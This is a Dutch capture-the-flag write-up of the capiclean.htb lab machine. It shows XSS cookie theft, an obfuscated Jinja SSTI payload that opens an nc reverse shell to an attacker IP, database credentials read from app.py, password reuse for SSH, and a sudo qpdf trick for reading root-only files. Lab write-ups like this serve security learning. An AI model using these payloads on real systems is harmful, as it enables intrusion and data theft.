# capiclean.htb

Eerste gezicht lijkt het een company-website voor een schoonmaak bedrijf. We
kunnen hier wel een aantal mogelijke users halen uit de info die hier te vinden
is.

Interessante links:

- capiclean.htb/login
  - Geeft een login page terug
- capiclean.htb/quote
  - Een UI om een quote op te vragen
- capiclean/dashboard
  - Gevonden met ffuf maar dit redirect terug naar de hoofdpagina

# Brute force logins

Levert zo snel niks op

# XSS/SSTI

Dit leverde niks op, ik weet dat er python draait maar er is geen reflectie te
vinden van de data.

XSS Via het `/quote` endpoint leverde ook niks op

# Stuck

Nadat ik een tijdje vastzat besloten naar een writeup te kijken. Daar zeggen ze
dat de exploit wel via XSS gaat via het `/quote` endpoint. 1 Machine reset later
en de XSS die ik probeerde werkte wel :/

# Cookie

Met XSS heb ik een cookie gekregen:

```
c2Vzc2lvbj1leUp5YjJ4bElqb2lNakV5TXpKbU1qazNZVFUzWVRWaE56UXpPRGswWVRCbE5HRTRNREZtWXpNaWZRLlppSllqUS51WDVqaFhMOHdKVERDN0x6RlpmUS01ejRsTGc=

# Vertaalt
session=eyJyb2xlIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMifQ.ZiJYjQ.uX5jhXL8wJTDC7LzFZfQ-5z4lLg
```

# /dashboard

Met de cookie kunnen we nu wel bij `/dashboard`. Hier vinden we een aantal
interessante dingen.

- Invoice generator
  - Hiermee kunnen we een invoice maken
- QR code generator
  - Hiermee krijgen we een qr code die linkt naar `/QRInvoice/invoice_{id}.html`
    - Deze url gooit een 500 als je een ander, niet bestaand, id meegeeft
  - Invoice ID kunnen we krijgen via de invoice generator
- Edit services
  - Hier kunnen we services aanpassen maar alleen de description is te updaten

Het invoice bevat random data dus daar kunnen we niet perse iets mee.

Het QR link veld is wel interessant. Dit lijkt calls te maken maar alleen als de
url begint met `capiclean.htb`?

Hier een `{{ 7*6 }}` ingooien toont weliswaar geen plaatje maar wel `42` in het
veld en niet `{{7*6}}`. We hebben hier dus een SSTI te pakken.

# Foothold

Na heel wat gekloot uiteindelijk een werkende combi gevonden:

```
invoice_id=123&form_type=scannable_invoice&qr_link={{request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fimport\x5f\x5f")("os")|attr("popen")("%72%6d%20%2f%74%6d%70%2f%66%3b%6d%6b%66%69%66%6f%20%2f%74%6d%70%2f%66%3b%63%61%74%20%2f%74%6d%70%2f%66%7c%62%61%73%68%20%2d%69%20%32%3e%26%31%7c%6e%63%20%31%30%2e%31%30%2e%31%34%2e%37%35%20%39%30%30%31%20%3e%2f%74%6d%70%2f%66")|attr("read")()}}
```

# mysql

Er is een mysql user dus waarschijnlijk ook een DB waar we bij kunnen, een
snelle cat van `app.py` en we hebben de gegevens:

```
user: iclean
password: pxCsmnGLckUb
database: capiclean
```

In de database waren twee users te vinden inclusief een gehasht wachtwoord. Van
`consuela` konden we het wachtwoord kraken en dit wachtwoord is ook te gebruiken
voor SSH.

# privesc

Met `sudo -l` komen we erachter dat `consuela` `qpdf` mag runnen als root.
Rondzoeken en ik zie geen optie om commands via `qpdf` te runnen maar we kunnen
wel bestanden als attachment toevoegen via `qpdf`.

```bash
sudo /usr/bin/qpdf --empty root.pdf --add-attachment /root/root.txt --;
```

Nu hebben we een pdf met daarin de root flag als attachment, puur nog printen en
we zijn klaar. Voor dit heb ik het bestand lokaal gehaald zodat het makkelijk
uit te lezen is. Waarschijnlijk kunnen we ook SSH mogelijk maken door een SSH
key uit te lezen.
